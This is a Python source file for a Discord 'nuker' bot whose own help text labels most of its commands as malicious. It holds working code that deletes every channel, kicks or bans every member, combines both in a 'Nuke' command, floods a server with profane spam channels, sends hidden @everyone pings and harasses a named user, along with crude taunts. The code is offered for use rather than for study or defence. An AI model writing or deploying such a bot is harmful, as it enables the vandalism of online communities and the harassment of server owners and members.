# BOT WAS ORIGINALLY MADE BY SAYZ
# FORKED AND UPDTAED BY GreatZardasht
import discord #import discord Module
import random #import random Module
from random import choice #Imports Command Module
from discord.ext import commands #Imports Command Module

client = commands.Bot(command_prefix = '>', case_insensitive=True) # Prefix
client.remove_command('help')
client.remove_command('Help')


@client.event #Function Decorater
async def on_ready(): #Bot is Ready
          print('Fucking can Begin!')
          await client.change_presence(activity=discord.Game("Fucking " + str(len(client.guilds)) + " Server(s) | Prefix: > | Made by Sayz!"), status=discord.Status.idle)




@client.command() #Function Decorater Command!
async def Ping(ctx): #Ping command
          await ctx.send(f':ping_pong: | The Current Bot-Ping is {round(client.latency * 1000)}ms') #Gives Ping in Ms




@client.command()
async def purge(ctx, amount=12000):
	  await ctx.message.delete()
	  await ctx.channel.purge(limit=amount)



@client.command() #Function Decorater Command!
async def Credits(ctx): #Random command
          await ctx.send(f'This Bot was Made by @【ｓａｙｚ．】#0001. Thanks to @Maddison#3383') #Random Command


@client.command()
async def help(ctx):

    embed = discord.Embed(
        colour=discord.Colour.red(),
        title="Help",
        description="Get the Command List!"
    )

    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/720843474659704932/720846031163752509/asdasd.PNG")
    embed.add_field(name=">PING", value="Displays Bots Current Ping in MS", inline=False)
    embed.add_field(name=">PURGE", value="Delets All Messages In The Current Channel", inline=False)
    embed.add_field(name=">CREDITS", value="Gives Credit to the Creator", inline=False)
    embed.add_field(name=">SILENTPING", value="Pings And Deletes it | Malicious Command!", inline=False)
    embed.add_field(name=">CHANNELDELETE", value="Deletes Every Channel | Malicious Command!", inline=False)
    embed.add_field(name=">CHANNELDELETEFAST", value="Deletes Every Channel but SUPER FAST | Malicious Command!", inline=False)
    embed.add_field(name=">MASSKICK", value="Kicks Everybody | Malicious Command!", inline=False)
    embed.add_field(name=">MASSBAN", value="Bans Everybody | Malicious Command!", inline=False)
    embed.add_field(name=">CLOWN", value="Clowns @User", inline=False)
    embed.add_field(name=">NUKE", value="Deletes Everything and Bans Everyone | SUPER Malicious Command!", inline=False)
    embed.add_field(name=">CHANNELCREATOR", value="Creates Spam Channels | Malicious Command!", inline=False)
    embed.set_footer(text="Made by Sayz aka Moontools.vip |")

    await ctx.send(embed=embed)



@client.command() #Function Decorater Command!
async def SilentPing(ctx): #Random command
          await ctx.send(f'@everyone @here', delete_after=0.1) #Random Command
          await ctx.message.delete()
 

@client.command()
async def Channeldelete(ctx):
        for channel in ctx.guild.channels:
        
            try:
                        await channel.delete()
                        await ctx.send(f'Deletet the channel "' + '#' + channel.name + '"')
            except:
                        await ctx.send(f'Deletet all Channels or Dont have High Enough Permissions')


@client.command()
async def Channeldeletefast(ctx):
        for channel in ctx.guild.channels:
        
            try:
                        await channel.delete()
                        print(f'Deletet the channel "' + '#' + channel.name + '"')
            except:
                        print(f'Deletet all Channels or Dont have High Enough Permissions')



@client.command(pass_context=True)
async def MassKick(ctx):
        
        for user in list(ctx.message.guild.members):
            try:
                await user.kick()
                await ctx.send(f"User " + user.name + " got Kicked. What a nub :white_check_mark: ")
            except:
                pass
                await ctx.send("Server Got Clapped! :smiling_imp: ")


@client.command(pass_context=True)
async def MassBan(ctx):
        
        for user in list(ctx.message.guild.members):
            try:
                await user.ban()
                await ctx.send(f"User " + user.name + " got Kicked. What a nub :white_check_mark: ")
            except:
                pass
                await ctx.send("Server Got Clapped! :smiling_imp: ")


@client.command(pass_context=True)
async def Nuke(ctx):



    for user in list(ctx.message.guild.members):
            try:
                await user.ban()
                print(f"User " + user.name + " got Kicked. What a nub :white_check_mark: ")
            except:
                pass
                await ctx.send("Server Got Clapped! :smiling_imp: ")

    for channel in ctx.guild.channels:
        
            try:
                        await channel.delete()
                        print(f'Deletet the channel "' + '#' + channel.name + '"')
            except:
                        print(f'Deletet all Channels or Dont have High Enough Permissions')



@client.command(pass_context=True)
async def Clown(ctx, member : discord.Member):
        
        await ctx.send(f':clown: :clown: @{member} :clown: :clown: ', delete_after=2)
        await ctx.send(f':clown: :clown: :clown: :clown: @{member}', delete_after=2)
        await ctx.send(f'@{member}:clown: :clown: :clown: :clown: ', delete_after=2)
        await ctx.send(f':clown: :clown: @{member} :clown: :clown: ', delete_after=2)
        await ctx.send(f':clown: @{member} :clown: ', delete_after=0.1)



@client.command() #Function Decorater Command!
async def ChannelCreator(ctx): #Random command
        guild = ctx.message.guild
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('MoonPanel')
        await guild.create_text_channel('Runs')
        await guild.create_text_channel('You')
        await guild.create_text_channel('Fucker')
        await guild.create_text_channel('Haxxord')
        await guild.create_text_channel('By')
        await guild.create_text_channel('MoonPanel')








client.run('TOKEN HERE') #Token



